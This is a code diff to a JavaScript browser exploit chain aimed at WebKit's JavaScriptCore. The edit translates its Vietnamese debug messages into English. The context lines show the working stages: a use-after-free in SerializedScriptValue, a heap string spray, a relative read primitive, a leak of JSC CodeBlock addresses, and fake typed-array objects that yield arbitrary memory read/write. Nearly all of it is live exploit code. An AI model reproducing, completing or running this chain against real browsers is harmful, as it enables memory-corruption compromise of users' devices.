@@ -204,7 +204,7 @@ async function uaf_ssv(fsets, index, save_pop=false) {
     let num_blurs = 0;
     const pop_promise = new Promise((resolve, reject) => {
         function onpopstate(event) {
-            // debug_log('bố đã đến');
+            // debug_log('pop came');
             if (num_blurs === 0) {
                 const r = reject;
                 r(new DieError(`pop came before blur. blurs: ${num_blurs}`));
@@ -216,7 +216,7 @@ async function uaf_ssv(fsets, index, save_pop=false) {
     });
 
     function onblur() {
-        // debug_log('mờ đến');
+        // debug_log('blur came');
         if (num_blurs > 0)  {
             die(`multiple blurs. blurs: ${num_blurs}`);
         }
@@ -277,12 +277,12 @@ async function uaf_ssv(fsets, index, save_pop=false) {
     await pop_promise;
     input.removeEventListener('blur', onblur);
 
-    // debug_log('xong đang chờ popstate');
+    // debug_log('done await popstate');
 
     for (const [i, view] of views.entries()) {
         if (view[0] !== 0x41) {
             // debug_log(`view index: ${hex(i)}`);
-            // debug_log('đã tìm thấy chế độ xem:');
+            // debug_log('found view:');
             // debug_log(view);
 
             input.remove();
@@ -302,7 +302,7 @@ async function uaf_ssv(fsets, index, save_pop=false) {
         }
     }
 
-    die('thất bại SerializedScriptValue UaF');
+    die('failed SerializedScriptValue UaF');
 }
 
 class Reader {
@@ -356,7 +356,7 @@ async function make_rdr(view) {
     const marker_offset = original_strlen - 4;
     const pad = 'B'.repeat(marker_offset);
 
-    // debug_log('bắt đầu phun dây');
+    // debug_log('start string spray');
     while (true) {
         for (let i = 0; i < num_strs; i++) {
             u32[0] = i;
@@ -406,7 +406,7 @@ async function make_rdr(view) {
     const rstr = Error(strs[idx]).message;
     // debug_log(`str len: ${hex(rstr.length)}`);
     if (rstr.length === 0xffffffff) {
-        // debug_log('xác nhận chính xác bị rò rỉ');
+        // debug_log('confirmed correct leaked');
         const addr = (
             view.read64(off.strimpl_m_data)
             .sub(off.strimpl_inline_str)
@@ -414,7 +414,7 @@ async function make_rdr(view) {
         // debug_log(`view's buffer address: ${addr}`);
         return new Reader(rstr, view);
     }
-    die("JSString chưa được sửa đổi");
+    die("JSString wasn't modified");
 }
 
 // we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
@@ -459,7 +459,7 @@ async function leak_code_block(reader, bt_size) {
     // debug_log(`search addr: ${search_addr}`);
 
     // debug_log(`func_src:\n${cache[0]}\nfunc_src end`);
-    // debug_log('bắt đầu tìm CodeBlock');
+    // debug_log('start find CodeBlock');
     let winning_off = null;
     let winning_idx = null;
     let winning_f = null;
@@ -523,7 +523,7 @@ async function leak_code_block(reader, bt_size) {
         // debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
     }
 
-    // debug_log('mảng chuỗi:');
+    // debug_log('string array:');
     rdr.set_addr(strs_addr);
     for (let i = 0; i < off.size_jsobj; i += 8) {
         // debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
@@ -624,7 +624,7 @@ async function make_arw(reader, view2, pop) {
     const propertyStorage = 8;
     const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;
 
-    log('GIAI ĐOẠN: rò rỉ CodeBlock');
+    log('STAGE: leak CodeBlock');
     // has too be greater than 0x10. the size of JSImmutableButterfly
     const bt_size = 0x10 + fakebt_off + arrayStorage_size;
     const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);
@@ -639,7 +639,7 @@ async function make_arw(reader, view2, pop) {
     const bt = new BufferView(pop.state);
     view.set(view_save);
 
-    log('ArrayBuffer trỏ tới JSImmutableButterfly:');
+    log('ArrayBuffer pointing to JSImmutableButterfly:');
     for (let i = 0; i < bt.byteLength; i += 8) {
         log(`${bt.read64(i)} | ${hex(i)}`);
     }
@@ -723,7 +723,7 @@ async function make_arw(reader, view2, pop) {
     const leaker_p = addrof(leaker);
 
     // we'll fake objects using a JSArrayBufferView whose m_mode is
-    // FastTypedArray. it'Sử dụng bộ đệm của nó là an toàn vì nó's GC-allocated. the
+    // FastTypedArray. it's safe to use its buffer since it's GC-allocated. the
     // current fastSizeLimit is 1000. if the length is less than or equal to
     // that, we get a FastTypedArray
     const scaled_sview = off.size_view / 4;
@@ -753,17 +753,17 @@ async function make_arw(reader, view2, pop) {
     bt.write64(fakebt_off + 0x10, faker_vector);
     const main = fake[0];
 
-    log('chính (chỉ vào công nhân):');
+    log('main (pointing to worker):');
     for (let i = 0; i < off.size_view; i += 8) {
         const idx = i / 4;
         log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
     }
 
     new Memory(main, worker, leaker, leaker_p.add(off.js_inline_prop));
-    log('đạt được r/w tùy ý');
+    log('achieved arbitrary r/w');
 
     rdr.restore();
-    // set the refcount to a high value so we don't giải phóng bộ nhớ, xem's
+    // set the refcount to a high value so we don't free the memory, view's
     // death will already free it (a StringImpl is currently using the memory)
     view.write32(0, -1);
     // ditto (a SerializedScriptValue is currently using the memory)
@@ -774,11 +774,11 @@ async function make_arw(reader, view2, pop) {
 
 async function main() {
     StartTimer();
-    log('GIAI ĐOẠN: UAF SSV');
+    log('STAGE: UAF SSV');
     const [fsets, indices] = prepare_uaf();
     const view = await uaf_ssv(fsets, indices[1]);
 
-    log('GIAI ĐOẠN: lấy chuỗi tương đối đọc nguyên thủy');
+    log('STAGE: get string relative read primitive');
     const rdr = await make_rdr(view);
     const [view2, pop] = await uaf_ssv(fsets, indices[0], true);   
 
@@ -787,7 +787,7 @@ async function main() {
         fset.cols = '';
     }
 
-    log('GIAI ĐOẠN: đạt được nguyên thủy đọc/ghi tùy ý');
+    log('STAGE: achieve arbitrary read/write primitive');
     await make_arw(rdr, view2, pop);
 
     clear_log();
